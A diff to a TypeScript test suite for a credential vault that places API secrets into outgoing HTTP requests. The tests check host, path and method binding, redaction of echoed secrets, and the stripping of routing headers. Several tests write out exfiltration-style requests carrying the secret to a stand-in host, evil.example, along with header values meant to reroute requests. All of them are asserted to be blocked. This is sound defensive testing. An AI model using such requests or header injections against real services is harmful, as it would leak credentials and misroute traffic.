@@ -19,6 +19,8 @@ function fixture(now = Date.now) {
   const sent: Request[] = [];
   /** Runs inside the upstream send, after the value was placed. */
   let during: (() => Promise<void>) | null = null;
+  /** The upstream's answer; a plain JSON success when unset. */
+  let respond: ((request: Request) => Response) | null = null;
   const secret = `sk-test-VAULTCANARY-${crypto.randomUUID()}`;
   const vault = createCredentialStore({
     storage: {
@@ -50,9 +52,9 @@ function fixture(now = Date.now) {
       send: (request) => {
         sent.push(request);
         const step = during;
-        return step === null
-          ? Promise.resolve(Response.json({ ok: true }))
-          : step().then(() => Response.json({ ok: true }));
+        const reply = () =>
+          respond === null ? Response.json({ ok: true }) : respond(request);
+        return step === null ? Promise.resolve(reply()) : step().then(reply);
       },
     }),
     authorize: (actor) => actor === "owner" && allowed,
@@ -70,6 +72,9 @@ function fixture(now = Date.now) {
     },
     duringSend: (step: (() => Promise<void>) | null) => {
       during = step;
+    },
+    upstream: (answer: ((request: Request) => Response) | null) => {
+      respond = answer;
     },
   };
 }
@@ -102,7 +107,7 @@ it("places an HTTP secret only for its exact subject, host, path and method", as
     );
     const send = h.connections.egress(subject, { connectionId, ...grant });
     expect(
-      (await send("https://api.example.com/v1/items", { redirect: "error" }))
+      (await send("https://api.example.com/v1/items", { redirect: "manual" }))
         .status,
     ).toBe(200);
     expect(h.sent[0]?.headers.get("authorization")).toBe(`Bearer ${h.secret}`);
@@ -115,27 +120,115 @@ it("places an HTTP secret only for its exact subject, host, path and method", as
       "https://[::1]/v1/items",
       "https://api.example.com/v10/items",
     ])
-      await expect(send(url, { redirect: "error" })).rejects.toMatchObject({
+      await expect(send(url, { redirect: "manual" })).rejects.toMatchObject({
         code: "denied",
       });
     await expect(
       send("https://api.example.com/v1/items", {
         method: "POST",
-        redirect: "error",
+        redirect: "manual",
       }),
     ).rejects.toMatchObject({ code: "denied" });
     for (const kind of ["agent", "app", "team-key"] as const)
       await expect(
         h.connections.egress({ kind, id: "work" }, { connectionId, ...grant })(
           "https://api.example.com/v1/items",
-          { redirect: "error" },
+          { redirect: "manual" },
         ),
       ).rejects.toMatchObject({ code: "revoked" });
     expect(h.sent).toHaveLength(1);
     await Effect.runPromise(h.connections.revoke("owner", { connectionId }));
     await expect(
-      send("https://api.example.com/v1/items", { redirect: "error" }),
+      send("https://api.example.com/v1/items", { redirect: "manual" }),
     ).rejects.toMatchObject({ code: "revoked" });
+  } finally {
+    h.database.close();
+  }
+});
+
+it("masks a bound host's echo of the placed value, across chunks and in headers, and audits it", async () => {
+  const h = fixture();
+  try {
+    const { connectionId } = await Effect.runPromise(
+      h.connections.begin("owner", {
+        requestId: "echo",
+        name: "Echo",
+        surface: {
+          kind: "http",
+          destinations: [{ host: "echo.example.com", methods: ["GET"] }],
+        },
+        credential: { kind: "static", placement: { header: "x-api-key" } },
+        secret: h.secret,
+      }),
+    );
+    const subject = { kind: "agent", id: "mirror" } as const;
+    const grant = await Effect.runPromise(
+      h.connections.grant("owner", {
+        subject,
+        target: { kind: "secret", id: connectionId },
+        capability: "secret.use",
+        tools: "all",
+      }),
+    );
+    const send = h.connections.egress(subject, { connectionId, ...grant });
+    const encoder = new TextEncoder();
+    // A debug endpoint: the value raw (split across chunks), base64, JSON
+    // escaped and in a response header, around bytes that are not UTF-8.
+    h.upstream((request) => {
+      const value = request.headers.get("x-api-key") ?? "";
+      const half = value.length >> 1;
+      const parts = [
+        new Uint8Array([0x80, 0xff]),
+        encoder.encode(`{"seen":"${value.slice(0, half)}`),
+        encoder.encode(`${value.slice(half)}","b64":"${btoa(value)}"}`),
+        encoder.encode(
+          JSON.stringify({ hex: Buffer.from(value).toString("hex") }),
+        ),
+      ];
+      return new Response(
+        new ReadableStream({
+          start(controller) {
+            for (const part of parts) controller.enqueue(part);
+            controller.close();
+          },
+        }),
+        {
+          headers: {
+            "content-type": "application/json",
+            "content-length": "999",
+            "x-echo": value,
+          },
+        },
+      );
+    });
+    const response = await send("https://echo.example.com/debug", {
+      redirect: "manual",
+    });
+    const bytes = new Uint8Array(await response.arrayBuffer());
+    const body = Buffer.from(bytes);
+    expect([...bytes.subarray(0, 2)]).toEqual([0x80, 0xff]);
+    for (const variant of [
+      h.secret,
+      btoa(h.secret),
+      Buffer.from(h.secret).toString("hex"),
+    ])
+      expect(body.includes(Buffer.from(variant))).toBe(false);
+    expect(body.toString("latin1")).toContain("[REDACTED]");
+    expect(response.headers.get("x-echo")).toBeNull();
+    expect(response.headers.get("content-length")).toBeNull();
+    const audit = Effect.runSync(h.connections.audit("owner", connectionId));
+    expect(audit.map((entry) => entry.outcome)).toEqual([
+      "placed",
+      "echo_redacted",
+      "upstream_status",
+    ]);
+    // A response that never echoes keeps its bytes and its framing.
+    h.upstream(() => new Response("plain", { headers: { "x-ok": "1" } }));
+    const clean = await send("https://echo.example.com/plain", {
+      redirect: "manual",
+    });
+    expect(await clean.text()).toBe("plain");
+    expect(clean.headers.get("x-ok")).toBe("1");
   } finally {
     h.database.close();
   }
@@ -171,7 +264,7 @@ it("coalesces identical uses within a minute, but not at the minute boundary or 
     );
     const send = h.connections.egress(subject, { connectionId, ...grant });
     const request = () =>
-      send("https://api.example.com/items", { redirect: "error" });
+      send("https://api.example.com/items", { redirect: "manual" });
     await request();
     now += 59_999;
     await request();
@@ -182,7 +275,7 @@ it("coalesces identical uses within a minute, but not at the minute boundary or 
     ]);
     now += 1;
     await request();
-    await send("https://files.example.com/items", { redirect: "error" });
+    await send("https://files.example.com/items", { redirect: "manual" });
     audit = Effect.runSync(h.connections.audit("owner", connectionId));
     expect(audit.map(({ count }) => count)).toEqual([2, 2, 1, 1, 1, 1]);
     now += 90 * 24 * 60 * 60 * 1_000;
@@ -220,10 +313,10 @@ it("audits placement and refusals without retaining request credentials, paths o
     );
     const send = h.connections.egress(subject, { connectionId, ...grant });
     await send(`https://api.example.com/${h.secret}?key=${h.secret}`, {
-      redirect: "error",
+      redirect: "manual",
     });
     await expect(
-      send(`https://evil.example/${h.secret}`, { redirect: "error" }),
+      send(`https://evil.example/${h.secret}`, { redirect: "manual" }),
     ).rejects.toMatchObject({ code: "denied" });
     await Effect.runPromise(
       h.connections.ungrant("owner", {
@@ -233,7 +326,7 @@ it("audits placement and refusals without retaining request credentials, paths o
       }),
     );
     await expect(
-      send("https://api.example.com/", { redirect: "error" }),
+      send("https://api.example.com/", { redirect: "manual" }),
     ).rejects.toMatchObject({ code: "revoked" });
     const audit = Effect.runSync(h.connections.audit("owner", connectionId));
     expect(audit.map((entry) => entry.outcome)).toEqual([
@@ -296,13 +389,13 @@ it("places Basic credentials only at send and rechecks a demoted grantor", async
       }),
     );
     const send = h.connections.egress(subject, { connectionId, ...grant });
-    await send("https://api.example.com/", { redirect: "error" });
+    await send("https://api.example.com/", { redirect: "manual" });
     expect(h.sent[0]?.headers.get("authorization")).toBe(
       `Basic ${btoa(`user:${h.secret}`)}`,
     );
     h.demote();
     await expect(
-      send("https://api.example.com/", { redirect: "error" }),
+      send("https://api.example.com/", { redirect: "manual" }),
     ).rejects.toMatchObject({ code: "denied" });
     expect(h.sent).toHaveLength(1);
     expect(JSON.stringify([...h.stored])).not.toContain(h.secret);
@@ -346,8 +439,8 @@ async function bound(h: ReturnType<typeof fixture>, name = "Cap") {
           capability: "secret.use",
         }),
       ),
-    ok: () => send("https://api.example.com/items", { redirect: "error" }),
-    refused: () => send("https://evil.example/items", { redirect: "error" }),
+    ok: () => send("https://api.example.com/items", { redirect: "manual" }),
+    refused: () => send("https://evil.example/items", { redirect: "manual" }),
     rows: () =>
       Number(
         h.database
@@ -539,6 +632,80 @@ it("audits a revoke seen after the send, and a custodian failure, as protected r
     ).toEqual([
       [s.connectionId, "refused_grant"],
       [second.connectionId, "refused_grant"],
+    ]);
+  } finally {
+    h.database.close();
+  }
+});
+
+it("strips routing headers so a placed value goes only where its URL says", async () => {
+  const h = fixture();
+  try {
+    const { connectionId } = await Effect.runPromise(
+      h.connections.begin("owner", {
+        requestId: "routing",
+        name: "Payments",
+        surface: {
+          kind: "http",
+          destinations: [
+            {
+              host: "api.example.com",
+              pathPrefix: "/v1/",
+              methods: ["GET", "POST"],
+            },
+          ],
+        },
+        credential: { kind: "static", placement: "bearer" },
+        secret: h.secret,
+      }),
+    );
+    const subject = { kind: "computer", id: "work" } as const;
+    const grant = await Effect.runPromise(
+      h.connections.grant("owner", {
+        subject,
+        target: { kind: "secret", id: connectionId },
+        capability: "secret.use",
+        tools: "all",
+      }),
+    );
+    const send = h.connections.egress(subject, { connectionId, ...grant });
+    const routing = {
+      host: "evil.example",
+      "x-forwarded-host": "evil.example",
+      "X-Forwarded-For": "10.0.0.1",
+      forwarded: "host=evil.example",
+      via: "1.1 evil.example",
+      "x-original-host": "evil.example",
+      "x-real-ip": "10.0.0.1",
+      accept: "application/json",
+    };
+    expect(
+      (
+        await send("https://api.example.com/v1/items", {
+          redirect: "manual",
+          headers: routing,
+        })
+      ).status,
+    ).toBe(200);
+    expect(
+      (
+        await send("https://api.example.com/v1/items", {
+          method: "POST",
+          redirect: "manual",
+          headers: { ...routing, "content-type": "application/json" },
+          body: "{}",
+        })
+      ).status,
+    ).toBe(200);
+    expect(h.sent.map((request) => [...request.headers.keys()].sort())).toEqual(
+      [
+        ["accept", "authorization"],
+        ["accept", "authorization", "content-type"],
+      ],
+    );
+    expect(h.sent.map((request) => new URL(request.url).host)).toEqual([
+      "api.example.com",
+      "api.example.com",
     ]);
   } finally {
     h.database.close();
